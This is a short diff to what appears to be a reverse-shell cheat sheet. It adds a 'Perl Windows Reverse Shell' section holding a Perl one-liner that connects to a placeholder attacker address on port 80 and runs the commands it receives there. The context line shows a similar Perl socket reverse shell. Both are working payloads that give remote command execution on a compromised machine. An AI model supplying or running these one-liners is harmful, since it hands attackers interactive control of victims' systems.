@@ -56,9 +56,12 @@ perl -e 'use Socket;$i="ATTACKINGIP";$p=80;socket(S,PF_INET,SOCK_STREAM,getproto
 
 ```
 
-#
+# Perl Windows Reverse Shell
 
-```
+```cmd
+
+perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+
 
 ```
 
